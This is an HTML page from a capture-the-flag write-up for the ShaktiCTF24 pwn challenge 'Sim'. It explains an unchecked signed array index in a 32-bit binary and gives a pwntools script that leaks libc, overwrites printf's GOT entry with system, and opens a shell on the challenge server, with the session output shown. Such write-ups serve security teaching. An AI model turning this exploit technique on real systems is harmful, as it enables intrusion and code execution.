@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF24/pwn/Sim/">
+        <link rel="shortcut icon" href="../../../img/favicon.ico">
+        <title>Sim - CTF-Writeups</title>
+        <link href="../../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/darcula.min.css">
+
+        <script src="../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../js/bootstrap.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-dark">
+            <div class="container">
+                <a class="navbar-brand" href="../../..">CTF-Writeups</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="navitem">
+                                <a href="../../../about/" class="nav-link">About Us</a>
+                            </li>
+                            <li class="navitem">
+                                <a href="../../../shaktictf/" class="nav-link">ShaktiCTF</a>
+                            </li>
+                            <li class="navitem">
+                                <a href="https://team-shakti.github.io/" class="nav-link">Website</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ml-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF24/pwn/Sim.md" class="nav-link">Edit on Team-Shakti/CTF-Write-ups
+                                    </a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-level="1"><a href="#sim" class="nav-link">Sim</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="sim">Sim</h1>
+<p><strong>Description</strong>:<br />
+Welcome back <code>Agent 007</code>! As you can see, the simulator is running an arc right now. But the arc seems to be in a meltdown. Can you break its security with its own computational power and save it?</p>
+<p><strong>Author:  <a href="https://twitter.com/Ath3n1x">Ath3n1x</a></strong></p>
+<p><strong>Solution</strong>: 
+This seems to be the last challenge where Agent 007 will be back. 
+You know the drill by now, <code>Checksec</code>:</p>
+<pre><code>    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8046000)
+    RUNPATH:  b'.'
+</code></pre>
+<p><code>Partial RELRO</code> opens up the possibility of GOT overwrite. 
+For a change, this is also a 32 bit binary contrary to the 64 bit binaries that we encountered in the challenges thus far. So the addresses are going to be 4 bytes. 
+<code>No PIE</code>, which means that the addess of the GOT table remains the same.</p>
+<p>On running the binary, we can see that we have 3 options: <code>add`, `show`, `break_armour</code>. All manipulates the reactor which is a global array declared as: <code>char *reactor[3][4]</code>. </p>
+<p>Now looking at the source code:</p>
+<pre><code class="language-C">void add(){
+
+    int idx;
+    puts(&quot;Enter the index :&quot;);
+    scanf(&quot;%d&quot;,&amp;idx);
+    puts(&quot;Enter the data :&quot;);
+    read(0,reactor[idx],0x4);
+
+}
+</code></pre>
+<p><code>idx</code> is signed. Integer overflow is a possibility which allows negative indexiing. Also, we can allocate/write anything at <code>reactor+idx</code>. This is particularly dangerous because we can modify the contents of the reactor array at any position specified by idx. If negative values are permitted, we could potentially overwrite critical areas of memory, such as the Global Offset Table (GOT), since both reactor and the GOT are stored in the BSS segment. By calculating the correct offset, we could overwrite a GOT entry with the address of the <code>libc system</code> function. This would allow us to hijack the program's execution flow and ultimately gain a shell.</p>
+<pre><code class="language-C">void show(){
+    int idx;
+    puts(&quot;Enter the index :&quot;);
+    scanf(&quot;%d&quot;,&amp;idx);
+    if(reactor[idx])
+        printf(&quot;%s\n&quot;,reactor[idx]);
+    else
+        puts(&quot;Not allocated!&quot;);
+}
+</code></pre>
+<p>There is no check in <code>idx</code>. This can be exploited to print the data stored at <code>reactor+(-idx)</code> location. </p>
+<p>We can use the above to get more consistent <code>libc</code> leaks (addresses get randomized on each run due to ASLR). Then we can calculate the <code>system</code> address from the leaks. At last, we can overwrite GOT table entry of <code>printf</code> with the address (system) that we calculated. </p>
+<pre><code class="language-C">    else if(choice == 3)
+        {
+            printf(break_);
+        }
+</code></pre>
+<p><em>[In main]</em>
+When the choice is 3, <code>printf(break_);</code> gets executed. So what if <code>break_</code> is <code>/bin/sh</code>? Viola! There pops the shell.</p>
+<p>Note: Alternatively, you can also make use of the format string vulnerability in the <code>printf(break_)</code> to get the required leaks.</p>
+<pre><code class="language-python">from pwn import *
+#p = process(&quot;./sim&quot;)
+
+p = remote('13.234.11.113',32651)
+
+def add(idx,data):
+    p.sendlineafter(&quot;MELTDOWN)\n&quot;,&quot;1&quot;)
+    p.sendlineafter(&quot;index :\n&quot;,str(idx))
+    p.sendlineafter(&quot;data :\n&quot;,data)
+
+def show(idx):
+    p.sendlineafter(&quot;MELTDOWN)\n&quot;,&quot;2&quot;)
+
+    p.sendlineafter(&quot;Enter the index :\n&quot;,str(idx))
+def leave():
+    p.sendlineafter(&quot;MELTDOWN)\n&quot;,&quot;3&quot;)
+
+p.sendline(&quot;/bin/sh\x00&quot;)
+show(&quot;268435454&quot;)
+
+print(&quot;leaks:&quot;)
+leak = u32(p.recvline()[:4].strip().ljust(4,b'\x00'))
+print(hex(leak))
+base = leak - 0x1d55c0
+system = base + 0x3ce10
+print(&quot;System address:&quot;, hex(system))
+add(&quot;268435449&quot;, p32(system))
+
+#gdb.attach(p)
+
+leave()
+p.interactive()
+</code></pre>
+<p>On running the script:</p>
+<pre><code>[*] Switching to interactive mode
+Choose your ACTION:
+1. add
+2. show
+3. break armour
+$ ls
+Dockerfile  flag.txt  ld-2.27.so  libc-2.27.so    libc.so.6  sim    sim.py    ynetd
+$ cat flag.txt
+shaktiCTF{Th3_4rc_15_s4v3d_4nd_h4ppy_pwn1ng}
+$ exit
+</code></pre>
+<p>:thumbsup::tada:</p>
+<p>Flag: <code>shaktictf{Th3_4rc_15_s4v3d_4nd_h4ppy_pwn1ng}</code>              </p></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2020 <a href="http://Team-Shakti.github.io/">Team-Shakti Writeups</a></p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../../js/base.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+        <script src="../../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
